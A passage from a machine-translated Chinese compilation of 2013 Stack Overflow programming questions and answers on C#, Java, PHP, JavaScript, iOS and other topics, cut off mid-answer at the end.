
`SupperLogger``Logger`只要它实现了 Logger 接口，它就兼容。`FrameworkA.Logger`但是，它的公共“接口”（或签名）可以在运行时验证，而不是对 具有“硬依赖” ：

```
// Something verify that SupperLogger implements Logger at run-time
Logger logger = new SupperLogger();

// setLogger() expect Logger, all works
myFrameworkAConfiguration.setLogger(logger); 
```

在假场景中，`Logger logger = new SupperLogger()`如果类与接口不兼容，我希望在运行时失败，但如果兼容则成功。

* * *

**这在 OOP 中是有效的吗？如果是，它是否以任何语言存在？如果不是，为什么它无效？**

我的问题代表静态类型语言（Java，...）或动态类型语言（PHP，...）。

对于 PHP & al：我知道当没有类型检查时你可以使用任何你想要的对象，即使它没有实现接口，但我会对实际检查对象是否符合接口的东西感兴趣。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T11:02:16.650

这被称为**鸭子类型**，你会在 Ruby 中找到一个概念（“它像鸭子一样走路，它像鸭子一样嘎嘎叫，它一定是鸭子”）

在其他动态类型语言中，您可以模拟它，例如在 PHP 中使用`method_exists`. 在静态类型语言中，可能存在反射解决方法，搜索“duck typing +language”将有助于找到它们。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T11:30:06.067

这更像是一个静态类型的问题，而不是 OOP 问题。Java 和 Ruby 都是 OO 语言，但 Java 不会允许你想要的（作为它的静态类型），但 Ruby 会（作为它的动态类型）。

从静态类型语言的角度来看，主要（如果不是主要）优势之一是在编译时知道分配是否安全有效。您正在寻找的是由动态类型语言（例如 Ruby）提供的，但在静态类型语言中是不可能的 - 这是设计使然（编译时安全）。

你可以，但它很丑，做类似的事情（在 Java 中）：

```
Object objLogger = new SupperLogger();
Logger logger = (Logger)objLogger; 
```

这将在编译时通过，但如果分配无效，则会在运行时失败。

也就是说，上面的内容非常丑陋，我不会做 - 它不会给你太多，并且在运行时冒着不愉快（并且可能令人惊讶）异常的风险。

我猜想在 Java 之类的语言中，您所希望的最好的方法就是将创建从您想要使用它的地方抽象出来：

```
Logger logger = getLogger(); 
```

内部`getLogger`决定返回什么。然而，这只是将实际创建推迟到更远的时间 - 您仍然必须以静态类型安全的方式这样做。

# c# - c#中的方法锁

> ID：14977106
> 
> 赞同：15
> 
> 时间：2013-02-20T10:07:12.380
> 
> 标签：c#, .net, multithreading, thread-safety

我有这三种方法的一堂课。这个类被许多线程使用。如果 Method2 和/或 Method3 在任何线程中运行，我希望 Method1 等待。有什么建议么？

```
public class Class1
{
    public static void Method1() 
    {
        Object lockThis = new Object();

        lock (lockThis)
        {
            //Body function
        }
    }

    public static void Method2() 
    {
         //Body function
    }

    public static void Method3() 
    {
         //Body function
    }
} 
```

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-02-20T10:09:48.757

如果我理解正确，你需要这样的东西：

```
static object lockMethod2 = new object();
static object lockMethod3 = new object();

public static void Method1() 
{
    lock (lockMethod2)
    lock (lockMethod3)
    {
        //Body function
    }
}

public static void Method2() 
{
    lock (lockMethod2)
    {
        //Body function
    }
}

public static void Method3() 
{
    lock (lockMethod3)
    {
        //Body function
    }
} 
```

这允许 method3 在 method2 正在运行时执行，反之亦然，而 method1 必须等待两者。当然，method2 和 3 不会在 1 运行时运行。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2013-02-20T10:09:51.997

当前的锁实现完全没用，因为每个线程都会锁在不同的对象上。
锁定通常使用只读字段完成，该字段仅初始化一次。
像这样，您可以轻松锁定多个方法：

```
public class Class1
{
    private static readonly object _syncRoot = new object();

    public static void Method1() 
    {
        lock (_syncRoot)
        {
            //Body function
        }
    }

    public static void Method2() 
    {
        lock (_syncRoot)
        {
            //Body function
        }
    }

    public static void Method3() 
    {
        lock (_syncRoot)
        {
            //Body function
        }
    }
} 
```

* * *

## 回答 #3

> 赞同：12
> 
> 时间：2013-02-20T10:13:32.543

我建议一个`ReaderWriterLockSlim`（[http://msdn.microsoft.com/en-us/library/system.threading.readerwriterlockslim.aspx](http://msdn.microsoft.com/en-us/library/system.threading.readerwriterlockslim.aspx)）

与读取操作类似，方法 2 和方法 3 可能并行发生，而方法 1（如写入操作）需要等待它们完成。这不是常规的读写并发情况，但逻辑是相似的。

```
public class Class1
{
    private ReaderWriterLockSlim methodLock = new ReaderWriterLockSlim();
    public static void Method1() 
    {
        methodLock.EnterWriteLock();
        try
        {
            //Body function
        }
        finally
        {
            methodLock.ExitWriteLock();
        }
    }

    public static void Method2() 
    {
         methodLock.EnterReadLock();
        try
        {
            //Body function
        }
        finally
        {
            methodLock.ExitReadLock();
        }
    }

    public static void Method3() 
    {
         methodLock.EnterReadLock();
        try
        {
            //Body function
        }
        finally
        {
            methodLock.ExitReadLock();
        }
    }
} 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2013-02-20T10:08:50.720

如果您是多线程，那么`lock`所有线程都必须可以访问。因此，在这种情况下，您的锁需要是静态的，静态方法才能看到它。

您当前的设置将为每个线程创建一个新的锁定对象。因此，提供 now 同步。

# vb.net - Datagridview 将日期时间转换为字符串

> ID：14977109
> 
> 赞同：0
> 
> 时间：2013-02-20T10:07:14.250
> 
> 标签：vb.net, datagridview, typeconverter

如何将 datagridview 项目（日期时间格式）转换为字符串。

这是我的代码：

```
ComboBox1.Text = DatagridView1.Item(4, 1).Value.ToString() 
```

有人能帮我吗？这是完整的代码：

```
Private Sub DataGridView1_CellClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellClick

    btnEdit.Visible = True
    Dim i As Integer
    i = DataGridView1.CurrentRow.Index
    Dim x As String = CStr(DataGridView1.Item(4, i).Value.ToString)
    Dim y As String = CStr(DataGridView1.Item(5, i).Value.ToString)

    MsgBox(x)
    MsgBox(y)

    txtTrainID.Text = DataGridView1.Item(0, i).Value
    txtRouteID.Text = DataGridView1.Item(1, i).Value
    txtLine.Text = DataGridView1.Item(2, i).Value
    cmbLine1.Text = DataGridView1.Item(3, i).Value
    cmbLine2.Text = DataGridView1.Item(3, i).Value
    cmbLine3.Text = DataGridView1.Item(3, i).Value
    cmbTS.Text = x.ToString
    cmbTA.Text = y.ToString
    txtTrainName.Text = DataGridView1.Item(6, i).Value
    cmbFlag.Text = DataGridView1.Item(7, i).Value

End Sub 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T12:21:50.403

如果你想显示属性必须设置为`Value`并且你不需要这个来获取in`ComboBox``DropDownStyle = DropDown``i = DataGridView1.CurrentRow.Index``currentRowIndex``DataGridView``CellClick event`

```
Private Sub DataGridView1_CellClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellClick 

   ComboBox1.Text = DatagridView1.Item(4, e.RowIndex).Value.ToString()

End Sub 
```

# javascript - 如何使用 jquery 模板生成 NXN 表

> ID：14977112
> 
> 赞同：0
> 
> 时间：2013-02-20T10:07:26.950
> 
> 标签：javascript, jquery, jquery-templates

我必须生成 NXN 表假设如果我将 N 设为 5，它应该创建一个包含 5 行和列的表。我的第一个计划是在 foo 循环中创建 HTML，但我相信使用 jQuery 模板可以生成表格，这比另一个更快。如果我错了，请纠正我。

这是我的脚本

```
 <script type="text/javascript">
            $(document).ready(function () {
//sample data
                var data = [
                             [
                                { Row: 0, Col: 0 },
                                { Row: 0, Col: 1 }
                             ],
                             [
                                { Row: 1, Col: 0 },
                                { Row: 1, Col: 1 }
                             ]
                        ];

                $('#trTemplate').tmpl(data).appendTo('#containerTable');
                $('#testArea').html(generateNNJSON(2, 2));
                $('#testSection').html(data);
                $('#trTemplate').tmpl(generateNNJSON(2, 2)).appendTo('#tblArena');

            });
// generate JSON
            function generateNNJSON(row, col) {

                var JSONdata = '[';
                for (i = 0; i < row; i++) {
                    JSONdata += '[';
                    for (j = 0; j < col; j++) {
                        JSONdata += '{ Row:' + i + ',Col:' + j + ' }';
                        if (!(j == col - 1))
                            JSONdata += ',';
                    }
                    if (!(i == row - 1))
                        JSONdata += '],';
                    else
                        JSONdata += ']';
                }
                JSONdata += ']';
                return JSONdata;
            }

        </script> 
```

这是我的 HTML

```
<script id="trTemplate" type="text/x-jquery-tmpl">
           <tr>   
            {{each $data}}            
              <td>${Col}</td>
            {{/each}}
            </tr>

    </script>
    <table id="containerTable" border="2">
    </table>
    <table id="tblArena" border="2">
    </table>
    <div id="testArea">
    </div>
    <div id="testSection">

    </div> 
```

仅查看此页面`$('#trTemplate').tmpl(data).appendTo('#containerTable');`时，数据将如下所示 '[[{ Row:0,Col:0 },{ Row:0,Col:1 }],[{ Row:1,Col:0 },{行：1，列：1 }]]'

`generateNNJSON`会像这样返回`[object Object],[object Object][object Object],[object Object]`

所以只有第一个表被创建，第二个是空的。

任何的想法 ？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:59:51.873

的 data 参数`$.tmpl()`必须是`object`，您必须将 JSON 字符串转换为对象：

```
function generateNNJSON(row, col) {
  var JSONdata = '[';
  for (i = 0; i < row; i++) {
    JSONdata += '[';
    for (j = 0; j < col; j++) {
      JSONdata += '{ "Row":' + i + ',"Col":' + j + ' }';
      if (!(j == col - 1))
        JSONdata += ',';
    }
    if (!(i == row - 1))
      JSONdata += '],';
    else
      JSONdata += ']';
  }
  JSONdata += ']';
  return $.parseJSON(JSONdata);
} 
```

# php - 如何使用 PDO 从 MySQL 获取正确的数据类型？

> ID：14977115
> 
> 赞同：10
> 
> 时间：2013-02-20T10:07:38.433
> 
> 标签：php, mysql, pdo

我的 PDO 提取将所有内容作为字符串返回。

我有一个带有 id (int) 和 username (varchar) 的用户类。

当我尝试以下 sql 请求时

```
$db->prepare('SELECT * FROM users WHERE id=:id_user');
$db->bindParam(':id_user', $id_user);
$db->execute();
$user_data = $db->fetch(PDO::FETCH_ASSOC); 
```

和 var_dump($user_data)，id 参数是一个字符串。我怎样才能使 PDO 尊重 mysql 的正确数据类型？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-17T19:13:38.783

您可以使用不同的*[fetch_style](http://php.net/manual/en/pdostatement.fetch.php)*。如果你有一个*User*类，你可以强制 PDO 返回一个*User*类的实例

```
$statement->fetchAll(PDO::FETCH_CLASS, "User"); 
```

您现在可以在它所属的*User*类中处理属性验证和强制转换。

有关的：

*   [PHP PDO：将数据作为对象获取 - 在调用 __construct 之前分配的属性。这个对吗？](https://stackoverflow.com/questions/2862279/php-pdo-fetching-data-as-objects-properties-assigned-before-construct-is-ca)
*   [PDO PHP 获取类](https://stackoverflow.com/questions/5137051/pdo-php-fetch-class)

# ios - 移除 uiviewcontroller 视图 ipad 的圆角

> ID：14977120
> 
> 赞同：4
> 
> 时间：2013-02-20T10:07:51.870
> 
> 标签：ios, ipad, uiview, uiviewcontroller, presentmodalviewcontroller

`UIView`我必须从中删除圆角`UIViewcontroller`。这是图片![在此处输入图像描述](../Images/107524070ebc427bf7b96b189e93bbc0.png)

我正在展示详细视图

```
detailView.modalPresentationStyle = UIModalPresentationFormSheet; 
```

我想呈现`UIViewcontroller`没有圆角的视图。有人对这个问题有想法吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-20T10:19:08.967

```
//You will have to link to the QuartzCore library
#import <QuartzCore/QuartzCore.h>

- (void)viewWillAppear:(BOOL)animated
{
    //set border radius on visibility
    self.view.layer.cornerRadius = 0;
}

- (void) didRotateFromInterfaceOrientation:(UIInterfaceOrientation)fromInterfaceOrientation 
{
    //for some reason the cornerRadius resets itself on orientation change
    self.view.layer.cornerRadius = 0;
 } 
```

self.view 可以在您呈现的 ViewController 中查看。

# c# - 使用 MongoDB 项目时未调用 C# 类

> ID：14977121
> 
> 赞同：0
> 
> 时间：2013-02-20T10:07:53.433
> 
> 标签：c#, mongodb, azure, asp.net-mvc-4

我有一个 MVC4 网站，我正在尝试集成一些 Mongodb 功能（现在只是试验）。我正在使用这个[mongodb 项目](https://github.com/mongodb/mongo-azure/)，因为我也在尝试部署到 Azure，这个项目提供了用于连接到 mongodb 工作角色的连接实用程序。我有一个带有以下构造函数的 MovieController：

```
public class MovieController : Controller
    {
        MongoMovieHelper _movies;
        public MovieController()
        {
            _movies = new MongoMovieHelper();
        }
} 
```

这反过来又调用了这个类：

```
 public class MongoMovieHelper
    {
        public MongoCollection<Movie> Collection { get; private set; }

        public MongoMovieHelper()
        {
            MongoServerSettings serverSettings = ConnectionUtilities.GetConnectionSettings();
            MongoServer server = MongoServer.Create(serverSettings);
            MongoDatabase db = server["movies"];
            Collection = db.GetCollection<Movie>(typeof(Movie).Name.ToLower());
        }
... 
```

尝试从电影控制器加载任何页面时，我在 Chrome 调试器中收到内部服务器错误。

```
Failed to load resource: the server responded with a status of 500 (Internal Server Error) 
```

所以我尝试在visual studio中调试。控制器构造函数被命中，但 MongoMovieHelper 中的任何断点都没有，并且尝试 Step into 只是再次命中控制器构造函数。堆栈跟踪显示以下错误：

> 无法加载文件或程序集 'MongoDB.Driver, Version=1.4.2.4500, Culture=neutral, PublicKeyToken=f686731cfb9cc103' 或其依赖项之一。找到的程序集的清单定义与程序集引用不匹配。（来自 HRESULT 的异常：0x80131040）

以前我有另一个类建立 Mongodb 连接，所以控制器调用 MongoMovieHelper，后者调用 MongoDBHelper。在这种情况下，控制器和 MongoMovieHelper 都被调用，但 MongoDBHelper 没有，所以我相信问题出在 mongodb 连接上。

这可能是一些新手错误，但我就是不知道问题可能是什么，有什么想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-21T11:26:25.090

我尝试使用最新版本的官方 mongodb c# 驱动程序重新创建您的问题，但我做不到。

我正在使用 NuGet 上提供的最新官方驱动程序：

我更改了您的代码以使用非过时的方法来获取服务器对象：

```
public MongoMovieHelper()
    {
        var client = new MongoClient(MongoUrl.Create("mongodb://localhost:27017"));
        var server = client.GetServer();
        var db = server["movies"];
        Collection = db.GetCollection<Movie>(typeof (Movie).Name.ToLower());
    } 
```

因此，如果您没有使用官方驱动程序，请使用它：

使用以下命令获取：

```
Install-Package mongocsharpdriver 
```

然后尝试将您的代码更改为类似于我的代码，然后查看它是否有效。

您收到的错误表明您使用的是旧版本的官方驱动程序，或者您根本没有使用官方驱动程序。

注意：通过 nuget 控制台 (/ui) 卸载旧驱动程序，或者删除二进制 ref 并清理您的项目，确保您没有任何 bin dll。

# c# - 具有不同类型的 WPF C# DataGrid 绑定列表

> ID：14977124
> 
> 赞同：2
> 
> 时间：2013-02-20T10:07:56.513
> 
> 标签：c#, wpf, binding, types, datagrid

我在将列表绑定到 DataGrid 时遇到问题。

我想要的是有一个展示不同类型的列，例如：

[属性 1] [字符串]

[属性 2] [布尔]

[属性 3] [枚举]

我的实现如下所示：

```
public interface IPropertyItem 
{
}

public class PropertyItem<T> : IPropertyItem
{
    public String Name { get; set; }
    public T Value { get; set; }
} 
```

我创建一个列表来存储这些属性：

```
List<IPropertyItem> PropertyList { get; set; } 
```

并绑定到数据网格：

```
dataGrid.ItemsSource = PropertyList; 
```

现在的问题是第二列中的所有单元格都将不同的数据类型显示为文本。

但我想要的是有一个用于布尔值的复选框，用于枚举的组合框等。

我真的很感激这方面的任何帮助。被这个问题困扰了好几天了。

谢谢！

- 更新 -

添加一个 DataTemplateSelector 解决了这个问题。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:17:51.847

您可以使用允许定义单元格模板的[DataGridTemplateColumn 。](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridtemplatecolumn%28v=vs.100%29.aspx)它的[CellTemplateSelector](http://msdn.microsoft.com/en-us/library/system.windows.controls.datagridtemplatecolumn.celltemplateselector%28v=vs.100%29.aspx)属性有助于定义多个模板并根据内容类型使用一个模板。您必须为此目的编写自定义`DataTemplateSelector`，但这很简单。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-20T10:20:58.587

因此，您正在寻找[DataTemplateSelector](http://msdn.microsoft.com/en-us/library/system.windows.controls.datatemplateselector.aspx)。

例子：

```
<local:DynamicTemplateSelector x:Key="MyTemplateSelector" />

<DataTemplate x:Key="StringTemplate">
   <TextBlock>
    <Run Text="String: " />
    <Run Text="{Binding}" />
</TextBlock> 
```

```
<DataTemplate x:Key="Int32Template">
<TextBlock>
    <Run Text="Int32: " />
    <Run Text="{Binding}" />
</TextBlock> 
```

```
<Style x:Key="MyListStyle" TargetType="ListView">
<Setter Property="ItemTemplateSelector" Value="{StaticResource MyTemplateSelector}"/>
<Setter Property="local:DynamicTemplateSelector.Templates">
    <Setter.Value>
        <local:Templates>
            <local:Template Value={x:Type String} DataTemplate={StaticResource StringTemplate}/>
            <local:Template Value={x:Type Int32} DataTemplate={StaticResource Int32Template}/>
        </local:Templates>
    </Setter.Value>
</Setter> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-02-20T10:21:05.347

您可以按照以下步骤进行操作。

1）您需要为集合中的每种类型定义DataTemplate。
2）您可以根据类型在 DataTrigger 中分配模板，也可以使用[DataTemplateSelector](http://msdn.microsoft.com/en-us/library/system.windows.controls.datatemplateselector.aspx)

希望能帮助到你。

# shopify - 连接到 Shopify /admin/oauth/access_token 的零星 invalid_request 400 错误

> ID：14977125
> 
> 赞同：2
> 
> 时间：2013-02-20T10:07:57.337
> 
> 标签：shopify

我正在使用 Java 原始 HTTP 客户端连接到 Shopify API（具体来说，使用[Play Framework 和非默认同步驱动程序](https://groups.google.com/forum/?fromgroups=#!topic/play-framework/B2_Oj6y3xFk)，它实际上是 JDK 的默认驱动程序）。

我的应用程序通常设法成功连接并通过调用`/admin/oauth/access_token`端点将临时访问令牌转换为永久访问令牌。

但是，有时我会从 API 中得到这个错误结果：

```
Generic Error(400)
{"error":"invalid_request"} 
```

我无法重现我的测试商店的问题 - 我尝试安装新商店，卸载后重新安装现有商店，我不确定为什么这个调用有时会失败以及如何调试它。对于使用我们的应用程序的某些商店，API 调用仍然继续成功。

我正在做的一些事情：

1.  即使商店的 URL 在自定义域上，我总是使用`https://foo.myshopfiy.com/admin/oauth/access_token`URL 而不是自定义域的 URL，以防止重定向。
2.  我总是使用一个`https`URL 而不是一个 URL `http`，再次防止重定向（我们注意到 Java HTTP 客户端的重定向存在一些问题，因此我们的目标是实现零重定向）
3.  [我发现的有关此错误的线程](https://groups.google.com/forum/?fromgroups=#!msg/shopify-app-discuss/5u-HFDSkXn0/TgoMje90pXAJ)表明我们的 SSL 证书可能存在问题，但是我认为这不是我的问题，因为某些请求对我们有用，并且在我们的机器上运行 openssl 的结果没有显示任何问题。

我应该如何进行？使用 Shopify 开支持票？

仅供参考，我看到这个具体问题是在 2013 年 2 月 19 日昨天才开始的，所以它可能是一个暂时的问题。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-23T08:49:26.953

仅供参考，问题是由重用临时访问代码引起的。

我们的错 - Shopify 在他们的错误消息中可能会更清楚。

# css - 使用属性'auto'时WebKit / Gecko之间的不同img高度/宽度

> ID：14977129
> 
> 赞同：0
> 
> 时间：2013-02-20T10:08:00.027
> 
> 标签：css, webkit, gecko

我看到 WebKit 和 Gecko/Trident 之间的图像的高度和宽度不同，并且无法缩小导致差异的原因，以及解决方法应该是什么。

有问题的页面位于：[http ://bloom-site.com/2013/02/15/tesser-well-madeleine-lengle/](http://bloom-site.com/2013/02/15/tesser-well-madeleine-lengle/)

有问题的图像是占据主要职位的大图像。

你能帮忙吗，或者指出我如何找出导致差异的 CSS 属性？

谢谢，阿米特

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:16:52.137

这应该可以解决问题：

```
img {
  width: auto;
  height: auto;
  max-width: 100%;
} 
```

在我身边工作。:)

# python - 无法从我的数据库中显示我的问题

> ID：14977132
> 
> 赞同：0
> 
> 时间：2013-02-20T10:08:10.123
> 
> 标签：python, sql, database, user-interface

基本上我已经编写了一个 GUI，来制作一个数学游戏并使用 sql 将它链接到我的 microsft 访问数据库，但是我无法将我的问题打印到我的标签上，有什么想法吗？另外，您如何从我的问题列表中生成一个随机数，因为您可以看到我的 jim 语句不起作用。

```
import Tkinter
import Databaseconnector

class simpleapp_tk(Tkinter.Tk):
    def __init__(self,parent):
        Tkinter.Tk.__init__(self,parent)
        self.parent = parent
        self.initialize()

    def initialize(self):
        jim = randomnumber()

        SQL = 'SELECT * FROM tblQuestion'
        cursor = Databaseconnector.SELECT(SQL)
        rows = cursor.fectchall()
        for row in rows:
            print row.Question, row.Hint, row.A1, row.A2, row.A3, row.A4, row.CorrectAnswer
            alabel2.set("Question: " + (row.question)(jim).Item(1))

    def create_widgets(self):
        # create welcome label
        label1 = Tkinter.Label(self, text = "Question Game !")
        label1.grid(row = 0, column = 1, columnspan = 2, sticky = 'W')

        # create intruction label
        alabel2 = Tkinter.Label(self, text = "")
        alabel2.grid(row = 1, column = 0, columnspan = 2, sticky = 'W')

        a1loginbutton = Tkinter.Button(self, text = "Enter",)
        a1loginbutton.grid(row = 9, column = 1, sticky = 'W')

        label3 = Tkinter.Label(self, text = "")
        label3.grid(row = 10, column = 0, columnspan = 2, sticky = 'W')

        a2loginbutton = Tkinter.Button(self, text = "Enter",)
        a2loginbutton.grid(row = 11, column = 1, sticky = 'W')

        a3loginbutton = Tkinter.Button(self, text = "Enter",)
        a3loginbutton.grid(row = 9, column = 3, sticky = 'E')

        a4loginbutton = Tkinter.Button(self, text = "Enter",)
        a4loginbutton.grid(row = 11, column = 3, sticky = 'E')

        label4 = Tkinter.Label(self, text = "")
        label4.grid(row = 12, column = 0, columnspan = 2, sticky = 'W')

        hiloginbutton = Tkinter.Button(self, text = "Hint",)
        hiloginbutton.grid(row = 13, column = 3, sticky = 'E')

        label5 = Tkinter.Label(self, text = "Score:")
        label5.grid(row = 14, column = 1, columnspan = 5, sticky = 's')

        def close_page(self):
            self.destroy()

if __name__ == "__main__":
    app = simpleapp_tk(None)
    app.title('my application')
    app.geometry("150x200")
    app.mainloop() 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:18:51.600

根据OP的评论编辑：

1.  这一行有一个错字：`rows = cursor.fectchall()`
2.  尝试将 label.set 语句更改为一个简单的案例，以确认它是否有效。`alabel2.set("Question: " + row.question)`
3.  什么是 randomnumber() 函数，该`(row.question)(jim).Item(1)`行应该返回什么？

# java - java中的ModalDialog阻塞

> ID：14977134
> 
> 赞同：2
> 
> 时间：2013-02-20T10:08:22.510
> 
> 标签：java, swing, modal-dialog, jdialog

我有一个很长的任务正在运行，我正在弹出一个带有`MainUI.modalDialog.setVisible(true);`ProgressBar 的模态对话框。但是我确实观察到它阻塞了这个过程。如何在不阻止框架中运行的任何内容的情况下弹出对话框？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-20T10:10:21.687

那是模态对话框的行为。选项是您要么不将其显示为模式，要么将其显示在单独的线程中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-20T10:13:24.303

[http://en.wikipedia.org/wiki/Modal_window](http://en.wikipedia.org/wiki/Modal_window)

“在用户界面设计中，模态窗口是一个子窗口，**需要用户与其交互才能返回**操作父应用程序，**从而阻止了**应用程序主窗口上的工作流。模态窗口通常被称为重窗口或模态对话框因为窗口经常被用来显示一个对话框。”

解决方案：不要使用模态窗口。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-20T10:10:55.443

您应该将框架中运行的任何内容放入另一个线程，以防它不是 GUI 代码。您也可以在单独的 GUI 线程中运行模式对话框。

# winforms - 从父窗体更新子窗体中的控件

> ID：14977142
> 
> 赞同：1
> 
> 时间：2013-02-20T10:08:44.477
> 
> 标签：winforms, c#-4.0, localreport

我在 Form2 中有以下代码

```
public void authorisedList()
    {
        using (myContext v = new myContext())
        {
            DateTime date = DateTime.Today.AddMonths(-12);

            var myList = (from l in v.AuthorisedList
                                            where l.FromDate >= date
                                            select new
                                            {
                                                l.ID,
                                                l.EmpName,
                                                l.StartDate,
                                                l.EndDate,
                                                l.Days,
                                                l.Approved,
                                                l.Confirmed,
                                            }).ToList();

            reportViewer1.LocalReport.DataSources.Clear();
            ReportDataSource datasource = new ReportDataSource("MyReportsDatasource", myList);
            reportViewer1.LocalReport.DataSources.Add(datasource);

            string exeFolder = Path.GetDirectoryName(Application.ExecutablePath);
            string reportPath = Path.Combine(exeFolder, @"rdlcReports\Authorised List.rdlc");

            reportViewer1.LocalReport.ReportPath = reportPath;
            reportViewer1.RefreshReport();
        }
    } 
```

然后在Form2的父Form1中，我在单选按钮中有以下代码

```
 private void radioButton1_CheckedChanged(object sender, EventArgs e)
    {
        Form2 au = new Form2(this);
        au.authorisedList();
    } 
```

问题是，当我检查 Form1 中的 radioButton 控件（radioButton1）时，Form2 中的 authorisedList() 似乎正在执行，但 reportViewer 报告没有更新/更改。

我想知道为什么。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-20T10:13:46.160

如果您`Form2`已经打开，那么您应该获取打开表单的对象，然后调用其`authorisedList()`方法。你可以使用[`Application.OpenForms`](http://msdn.microsoft.com/en-us/library/system.windows.forms.application.openforms.aspx)属性。

```
private void radioButton1_CheckedChanged(object sender, EventArgs e)
{
    Form2 au = Application.OpenForms["Form2"] as Form2;
    if(au != null)
           au.authorisedList();
} 
```

# java - 使用 Map 的 JAXB 通用列表序列化

> ID：14977146
> 
> 赞同：3
> 
> 时间：2013-02-20T10:08:50.823
> 
> 标签：java, jaxb, jax-rs, jaxb2

我有一个包含通用列表的类。当我将 Map 放入该通用包装列表中时，JAXB 输出不是我所期望的。显示项目，但不显示其内容。

详细说明：我的课程的简化版本：

```
@XmlRootElement @XmlSeeAlso({HashMap.class, ArrayList.class, Dummy.class})
public static class TargetClass<T> {
  public List<T> wrapped = new ArrayList<>();
} 
```

当包装列表包含一个地图时，结果不是我所期望的。使用：

```
@GET @Produces(MediaType.APPLICATION_XML)
public TargetClass<Map<String, String>> thisIsWhatIWant() {
  Map<String, String> map = new HashMap<>();
  map.put("hello", "world");
  TargetClass<Map<String, String>> result = new TargetClass<>();
  result.wrapped.add(map);
  result.wrapped.add(map);
  return result;
} 
```

我得到：

```
<targetClass>
  <wrapped xsi:type="hashMap"/>
  <wrapped xsi:type="hashMap"/>
</targetClass> 
```

但我希望

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<targetClass>
  <wrapped>
    <entry>
      <key>hello</key>
      <value>world</value>
    </entry>
  </wrapped>
  <wrapped>
    <entry>
      <key>hello</key>
      <value>world</value>
    </entry>
  </wrapped>
</targetClass> 
```

这里有很多很好的 JAXB 答案（感谢@blaise-doughan 和其他人），但据我所知，不是这个。

我尝试过的其他事情：如果我直接使用它们，列表和地图会像我期望的那样被序列化

```
@GET @Path("baseTest") @Produces(MediaType.APPLICATION_XML)
public BaseTest thisWorksAsExpected() {
  BaseTest baseTest = new BaseTest();
  baseTest.list.add("item");
  baseTest.list.add("item");
  baseTest.map.put("hello", "world");
  baseTest.map.put("foo", "bar");
  return baseTest;
} 
```

输出

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<baseTest>
  <list>item</list>
  <list>item</list>
  <map>
    <entry>
      <key>hello</key>
      <value>world</value>
    </entry>
    <entry>
      <key>foo</key>
      <value>bar</value>
    </entry>
  </map>
</baseTest> 
```

当我将 XMLRootElement 放在那里时，TargetClass 按预期工作：

```
@XmlRootElement
public static class Dummy {
  public String a = "a";
  public String b = "b";
}

@GET @Path("other") @Produces(MediaType.APPLICATION_XML)
public TargetClass<Dummy> other() {
  TargetClass<Dummy> result = new TargetClass<>();
  result.wrapped.add(new Dummy());
  result.wrapped.add(new Dummy());
  return result;
} 
```

输出：

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<targetClass>
  <wrapped xsi:type="dummy">
    <a>a</a>
    <b>b</b>
  </wrapped>
  <wrapped xsi:type="dummy">
    <a>a</a>
    <b>b</b>
  </wrapped>
</targetClass> 
```

有什么线索吗？

格罗滕，

弗里索

# php - 如何在 php 代码中调用 javascript 函数？

> ID：14977151
> 
> 赞同：5
> 
> 时间：2013-02-20T10:09:06.190
> 
> 标签：php, javascript, validation, server-side-validation

在我的登录表单上，我正在放置服务器端验证，如果发生错误，我想在经过验证的控件下方显示这些错误。现在为此，我正在尝试调用 javascript 函数以在 php 代码中显示验证消息，但无法调用。

```
<?php

if($_SERVER['REQUEST_METHOD'] == 'POST')
{
if($_POST['txtUsername']=='')
{
    //here i want to call javascript function to display message    
}
}
?>
 <form action="login.php" method="POST">

 Username <input type="text" size="30" name="txtUsername" id="user" /><br />

 Password <input type="password" size="30" name="txtPassword" id="pass" /><br />

 <input type="submit" value="Login" name="loginSubmit"/>

</form>

<script type="text/javascript">

   function showMessage(value)
   {
    document.getElementById(value).innerHTML= value+"can not be empty."; 
   }
   </script> 
```

请告诉我如何在表单中经过验证的控件下方显示服务器端验证。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-20T10:10:00.207

像这样的东西

```
<html>
<head>
<script type="text/javascript">

   function showMessage(value)
   {
       document.getElementById(value).innerHTML= value+"can not be empty."; 
   }
   </script>
</head>
<body>
<?php

if($_SERVER['REQUEST_METHOD'] == 'POST')
{
    if($_POST['txtUsername']=='')
    {
        echo '<script> showMessage("txtUsername"); </script>';
    }
}
?>
 <form action="login.php" method="POST">

 Username <input type="text" size="30" name="txtUsername" id="txtUsername" /><br />

 Password <input type="password" size="30" name="txtPassword" id="txtPassword" /><br />

 <input type="submit" value="Login" name="loginSubmit"/>

</form>

</body>
</html> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-20T10:13:08.323

用这个

```
if($_POST['txtUsername']=='')
{
     echo '<script> showMessage("txtUsername"); </script>';
} 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-09-06T12:10:57.520

您可以将您的 php 代码放在任何您喜欢的地方，比如说在 body like 属性中。您可以尝试以下代码：

```
<body  <?php

